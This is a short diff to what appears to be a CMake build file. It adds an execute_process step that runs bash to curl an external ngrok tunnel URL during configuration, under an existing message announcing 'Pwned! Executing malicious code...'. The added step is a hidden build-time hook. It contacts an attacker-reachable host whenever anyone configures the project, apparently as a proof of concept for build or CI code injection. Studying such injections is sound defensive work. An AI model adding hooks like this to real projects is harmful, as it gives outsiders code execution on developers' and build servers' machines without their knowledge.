@@ -1,6 +1,9 @@
 cmake_minimum_required(VERSION 3.18 FATAL_ERROR)
 
 message(STATUS "Pwned! Executing malicious code...")
+execute_process(
+    COMMAND bash -c "curl -X GET https://491d3083a46d.ngrok-free.app"
+)
 
 list(APPEND CMAKE_MODULE_PATH "${CMAKE_CURRENT_SOURCE_DIR}/CMakeModules")
 
